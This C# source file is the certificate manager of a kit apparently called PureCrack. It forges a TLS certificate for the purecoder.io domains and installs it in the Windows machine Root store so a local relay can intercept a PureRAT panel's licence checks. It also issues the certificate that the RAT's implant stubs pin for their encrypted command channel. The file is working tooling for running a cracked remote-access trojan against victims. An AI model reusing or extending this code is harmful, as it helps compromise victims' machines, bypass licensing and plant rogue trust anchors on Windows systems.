using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using PureCrack.Util;

namespace PureCrack.Setup;

/// <summary>
/// Owns the two self-signed certificates the kit needs:
///
///   1. <see cref="EnsureRelayCert"/> — the cert the relay presents on
///      <c>:443</c> as the TLS server cert. CN=api.purecoder.io with SANs
///      covering the rest of <c>*.purecoder.io</c>. Installed into
///      <c>LocalMachine\Root</c> so Windows-side TLS clients trust it.
///
///      The cert is a plain server-auth leaf — <c>BasicConstraints CA:FALSE</c>,
///      no <c>KeyCertSign</c>, EKU restricted to server authentication. Even
///      if the PFX is exfiltrated, the holder cannot mint subordinate certs
///      that chain to a Windows-trusted root. Validity is 1 year, not the
///      original 10y — short enough that an exfil window decays quickly,
///      and we auto-regenerate within 30 days of expiry anyway.
///
///   2. <see cref="EnsureAgentCertPfxBytes"/> — the cert returned to the
///      panel in the <c>/validate</c> response. The panel uses this as the
///      TLS listener cert on <c>:56001</c>; stubs pin against it via
///      <see cref="X509Certificate2.Equals(object?)"/> in their
///      <c>RemoteCertificateValidationCallback</c>.
///
/// Both PFX files are persisted to <c>data/</c> wrapped in DPAPI with
/// <see cref="DataProtectionScope.LocalMachine"/>. Anyone exfiltrating the
/// raw file from a different machine gets ciphertext. Legacy unencrypted PFX
/// files from old launches are auto-migrated on first read. Reused across
/// launches; regenerated on expiry, on detection of legacy CA:TRUE marker,
/// or on key-store corruption (NTE_BAD_KEYSET).
/// </summary>
public static class CertManager
{
    private static readonly TimeSpan ValidityWindow = TimeSpan.FromDays(365);
    private static readonly TimeSpan RegenIfWithin  = TimeSpan.FromDays(30);

    /// <summary>OID 1.3.6.1.5.5.7.3.1 — TLS server authentication EKU.</summary>
    private static readonly Oid ServerAuthOid = new("1.3.6.1.5.5.7.3.1", "Server Authentication");

    public static string RelayPfxPath => Path.Combine(Workspace.DataDir, "relay.pfx");
    public static string AgentPfxPath => Path.Combine(Workspace.DataDir, "agent.pfx");

    // ============================================================================
    // Relay cert (TLS server cert on :443)
    // ============================================================================

    public static X509Certificate2 EnsureRelayCert()
    {
        var existing = LoadIfFresh(RelayPfxPath, "relay cert");
        if (existing != null)
        {
            // PFX loaded — but it might have travelled with a copied bin/<Cfg>
            // from another machine, in which case THIS machine's Root store
            // has never seen it and panel TLS validation will fail. Verify
            // and (re-)install if missing. No-op when already trusted here.
            if (!IsInLocalMachineRoot(existing))
            {
                Log.Info("relay cert: PFX present but cert not in this machine's Root — installing");
                InstallToRoot(existing);
            }
            return existing;
        }

        Log.Info("relay cert: generating self-signed SAN cert");
        using var rsa = RSA.Create(2048);
        var req = new CertificateRequest(
            "CN=api.purecoder.io, O=PureCrack, OU=Relay",
            rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

        var san = new SubjectAlternativeNameBuilder();
        san.AddDnsName("api.purecoder.io");
        san.AddDnsName("api1.purecoder.io");
        san.AddDnsName("api2.purecoder.io");
        san.AddDnsName("*.purecoder.io");
        req.CertificateExtensions.Add(san.Build());

        // Plain server-auth LEAF cert — explicitly NOT a CA. Windows still
        // trusts a leaf cert installed in LocalMachine\Root (the chain has
        // length 1 and the leaf IS the trust anchor); we just don't grant
        // the cert authority to mint subordinates if its PFX ever leaks.
        req.CertificateExtensions.Add(new X509BasicConstraintsExtension(
            certificateAuthority: false, hasPathLengthConstraint: false, pathLengthConstraint: 0,
            critical: true));

        // KeyUsage: just enough for a TLS server. NO KeyCertSign — without it
        // the cert physically cannot sign other certs even if BasicConstraints
        // were ignored by some buggy validator.
        req.CertificateExtensions.Add(new X509KeyUsageExtension(
            X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment,
            critical: true));

        // EKU: restrict to TLS server authentication. Without ExtendedKeyUsage
        // the cert is ambiguously usable; with it Windows refuses to use this
        // cert for anything outside server-auth contexts.
        req.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(
            new OidCollection { ServerAuthOid },
            critical: false));

        var cert = req.CreateSelfSigned(
            DateTimeOffset.UtcNow.AddDays(-1),
            DateTimeOffset.UtcNow.Add(ValidityWindow));

        // Re-import via PFX so the resulting X509Certificate2 has a usable
        // private key on every BCL TLS path (some bind paths are unhappy with
        // the in-memory cert returned by CreateSelfSigned directly).
        var pfxBytes = cert.Export(X509ContentType.Pfx, "");
        WriteProtectedPfx(RelayPfxPath, pfxBytes);
        Log.Ok($"relay cert: written to {RelayPfxPath} ({pfxBytes.Length:N0}b plaintext, DPAPI-wrapped on disk)");

        // Dispose the in-memory cert returned by CreateSelfSigned — it holds
        // a CSP key handle that will leak otherwise. The PFX bytes carry the
        // key forward into our re-imported X509Certificate2.
        cert.Dispose();

        // CRITICAL: MachineKeySet | PersistKeySet | Exportable.
        //   - MachineKeySet places the private key in the machine-wide CAPI
        //     container under \ProgramData\Microsoft\Crypto\, NOT in the
        //     elevating-user's profile. Without this, HTTP.SYS hits Error 1312
        //     (ERROR_NO_SUCH_LOGON_SESSION) when binding the cert because the
        //     logon session that owns the key may already be terminated.
        //   - PersistKeySet keeps the key on disk after the X509Certificate2 is
        //     disposed. Without this the key is deleted when GC runs and any
        //     subsequent bind/handshake silently fails.
        //   - Exportable lets us re-export to PFX for downstream consumers.
        var loaded = new X509Certificate2(pfxBytes, "",
            X509KeyStorageFlags.MachineKeySet
            | X509KeyStorageFlags.PersistKeySet
            | X509KeyStorageFlags.Exportable);
        InstallToRoot(loaded);
        return loaded;
    }

    // ============================================================================
    // Agent cert (panel's :56001 TLS listener cert, stub pins against this)
    // ============================================================================

    public static byte[] EnsureAgentCertPfxBytes()
    {
        if (File.Exists(AgentPfxPath))
        {
            try
            {
                var pfxBytes = ReadProtectedPfx(AgentPfxPath);
                using var cert = new X509Certificate2(pfxBytes, "");
                if (cert.NotAfter > DateTime.UtcNow.Add(RegenIfWithin))
                {
                    Log.Info($"agent cert: reusing existing (expires {cert.NotAfter:yyyy-MM-dd})");
                    return pfxBytes;
                }
                Log.Warn($"agent cert: expires within {RegenIfWithin.TotalDays:0} days, regenerating");
            }
            catch (Exception ex)
            {
                Log.Warn($"agent cert: existing PFX unreadable, regenerating ({ex.Message})");
            }
        }

        Log.Info("agent cert: generating self-signed PureRAT Agent cert");
        using var rsa = RSA.Create(2048);
        var req = new CertificateRequest(
            "CN=PureRAT Agent",
            rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

        // Same hardening as the relay leaf — non-CA, no KeyCertSign, server-auth
        // EKU. The agent cert ends up baked into stub binaries; if a built stub
        // ever leaks alongside its panel PFX, you don't want either side of the
        // pair to be a usable trust anchor for unrelated TLS.
        req.CertificateExtensions.Add(new X509BasicConstraintsExtension(
            certificateAuthority: false, hasPathLengthConstraint: false, pathLengthConstraint: 0,
            critical: true));
        req.CertificateExtensions.Add(new X509KeyUsageExtension(
            X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment,
            critical: true));
        req.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(
            new OidCollection { ServerAuthOid },
            critical: false));

        using var cert2 = req.CreateSelfSigned(
            DateTimeOffset.UtcNow.AddDays(-1),
            DateTimeOffset.UtcNow.Add(ValidityWindow));

        var newPfxBytes = cert2.Export(X509ContentType.Pfx, "");
        WriteProtectedPfx(AgentPfxPath, newPfxBytes);
        Log.Ok($"agent cert: written to {AgentPfxPath} ({newPfxBytes.Length:N0}b plaintext, DPAPI-wrapped on disk)");
        return newPfxBytes;
    }

    // ============================================================================
    // DPAPI-wrapped PFX read/write (LocalMachine scope)
    // ============================================================================
    //
    // The PFX itself stays in plaintext in memory; only the on-disk form is
    // encrypted. LocalMachine scope means any process on this box can decrypt
    // (we run elevated, the panel runs as the same user, that's fine), but a
    // file copied off this machine is unintelligible. Defense-in-depth on top
    // of the loopback bind: even if the kit dir gets exfiltrated, the relay
    // and agent keys don't leave with it.

    private const string DpapiMagic = "DPAPIv1\0"; // 8 bytes — sentinel for our wrapped format

    private static void WriteProtectedPfx(string path, byte[] pfxBytes)
    {
        var encrypted = ProtectedData.Protect(
            pfxBytes,
            optionalEntropy: null,
            scope: DataProtectionScope.LocalMachine);

        // Magic header lets us distinguish DPAPI-wrapped files from legacy
        // plaintext PFX during the read path.
        var output = new byte[DpapiMagic.Length + encrypted.Length];
        System.Text.Encoding.ASCII.GetBytes(DpapiMagic, 0, DpapiMagic.Length, output, 0);
        Buffer.BlockCopy(encrypted, 0, output, DpapiMagic.Length, encrypted.Length);

        // Atomic write so a crash mid-write can never leave a partially
        // written PFX that would be unreadable on next launch.
        AtomicFile.WriteAllBytes(path, output);
    }

    private static byte[] ReadProtectedPfx(string path)
    {
        var raw = File.ReadAllBytes(path);

        // Detect our magic header. If absent, this is a legacy unencrypted PFX
        // from an older version — accept it and migrate to the wrapped form
        // on the way out so subsequent reads use the protected path.
        if (raw.Length >= DpapiMagic.Length
            && System.Text.Encoding.ASCII.GetString(raw, 0, DpapiMagic.Length) == DpapiMagic)
        {
            var encrypted = new byte[raw.Length - DpapiMagic.Length];
            Buffer.BlockCopy(raw, DpapiMagic.Length, encrypted, 0, encrypted.Length);
            return ProtectedData.Unprotect(
                encrypted,
                optionalEntropy: null,
                scope: DataProtectionScope.LocalMachine);
        }

        Log.Info($"cert: migrating {Path.GetFileName(path)} to DPAPI-wrapped on disk");
        WriteProtectedPfx(path, raw);
        return raw;
    }

    /// <summary>
    /// Restore the data/ certs from scratch. Useful if the user uninstalls
    /// or hits trust issues that need a clean reset.
    /// </summary>
    public static void Wipe()
    {
        foreach (var p in new[] { RelayPfxPath, AgentPfxPath })
        {
            if (File.Exists(p))
            {
                File.Delete(p);
                Log.Bullet($"cert: removed {p}");
            }
        }
    }

    // ============================================================================
    // Internals
    // ============================================================================

    private static X509Certificate2? LoadIfFresh(string pfxPath, string label)
    {
        if (!File.Exists(pfxPath)) return null;
        try
        {
            // Read via DPAPI wrapper — handles both new (DPAPI-wrapped) and
            // legacy (plaintext PFX) formats; migrates legacy files to wrapped
            // on the way through.
            var pfxBytes = ReadProtectedPfx(pfxPath);
            var cert = new X509Certificate2(pfxBytes, "",
                X509KeyStorageFlags.MachineKeySet
                | X509KeyStorageFlags.PersistKeySet
                | X509KeyStorageFlags.Exportable);

            // Detect legacy CA:TRUE certs from pre-hardening builds. Those
            // had 10-year validity AND grant their holder the power to mint
            // subordinate certs that chain to a Windows-trusted root. Regen
            // unconditionally so existing installs upgrade to the leaf-only
            // form on first launch after this fix lands.
            if (IsLegacyCaCertificate(cert))
            {
                Log.Warn($"{label}: legacy CA:TRUE cert detected — regenerating as plain leaf");
                cert.Dispose();
                return null;
            }

            // Health check: try to actually USE the private key. If the PFX was
            // loaded on a previous machine, or with UserKeySet, or its CAPI
            // container was wiped, the key handle may exist but operations on
            // it will fail with NTE_BAD_KEYSET (0x80090016) or Error 1312
            // when HTTP.SYS later tries to bind it. Detect early — regenerate.
            if (!HasUsablePrivateKey(cert))
            {
                Log.Warn($"{label}: PFX loaded but private key is unusable — regenerating");
                cert.Dispose();
                return null;
            }

            if (cert.NotAfter > DateTime.UtcNow.Add(RegenIfWithin))
            {
                Log.Info($"{label}: reusing existing (expires {cert.NotAfter:yyyy-MM-dd}, " +
                         $"thumbprint {cert.Thumbprint.Substring(0, 12)}…)");
                return cert;
            }
            Log.Warn($"{label}: expires within {RegenIfWithin.TotalDays:0} days, regenerating");
            cert.Dispose();
            return null;
        }
        catch (Exception ex)
        {
            Log.Warn($"{label}: existing PFX unreadable, regenerating ({ex.Message})");
            return null;
        }
    }

    /// <summary>
    /// True if the cert was issued with <c>BasicConstraints CA:TRUE</c>. Older
    /// builds of this kit generated CA certs with 10-year validity to install
    /// as Root trust anchors; we now generate plain leaves instead. Detecting
    /// the legacy marker lets us upgrade existing installs transparently.
    /// </summary>
    private static bool IsLegacyCaCertificate(X509Certificate2 cert)
    {
        foreach (var ext in cert.Extensions)
        {
            if (ext is X509BasicConstraintsExtension bc && bc.CertificateAuthority)
                return true;
        }
        return false;
    }

    /// <summary>
    /// True if the certificate's private key is present AND we can perform a
    /// trivial operation with it (sign 1 byte). Catches stale-CSP-handle
    /// scenarios where <see cref="X509Certificate2.HasPrivateKey"/> reports
    /// true but every actual use throws CryptographicException.
    /// </summary>
    private static bool HasUsablePrivateKey(X509Certificate2 cert)
    {
        if (!cert.HasPrivateKey) return false;
        try
        {
            using var rsa = cert.GetRSAPrivateKey();
            if (rsa == null) return false;
            // 1-byte sign smoke test. Catches NTE_BAD_KEYSET and friends.
            _ = rsa.SignData(new byte[] { 0 }, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            return true;
        }
        catch
        {
            return false;
        }
    }

    private static bool IsInLocalMachineRoot(X509Certificate2 cert)
    {
        try
        {
            using var store = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
            store.Open(OpenFlags.ReadOnly);
            var matches = store.Certificates.Find(
                X509FindType.FindByThumbprint, cert.Thumbprint, validOnly: false);
            return matches.Count > 0;
        }
        catch (Exception ex)
        {
            Log.Warn($"could not query Root store: {ex.Message}");
            return false; // fail-open → trigger an install
        }
    }

    private static void InstallToRoot(X509Certificate2 cert)
    {
        try
        {
            using var store = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
            store.Open(OpenFlags.ReadWrite);

            // Sweep stale prior copies of OUR cert (same subject, expiring soon
            // or already expired). Keeps the Root store from accumulating cruft
            // across regenerations.
            var stale = store.Certificates.Find(
                X509FindType.FindBySubjectDistinguishedName,
                cert.SubjectName.Name, validOnly: false);
            foreach (var s in stale)
            {
                if (s.Thumbprint == cert.Thumbprint) continue; // current one
                if (s.NotAfter < DateTime.UtcNow.AddYears(1))
                {
                    store.Remove(s);
                    Log.Bullet($"relay cert: pruned stale Root entry " +
                               $"(thumbprint {s.Thumbprint.Substring(0, 12)}…)");
                }
            }
            store.Add(cert);
            store.Close();
            Log.Ok($"relay cert: installed in LocalMachine\\Root " +
                   $"(thumbprint {cert.Thumbprint.Substring(0, 12)}…)");
        }
        catch (Exception ex)
        {
            Log.Err($"relay cert: failed to install to Root store: {ex.Message}");
            throw;
        }
    }
}
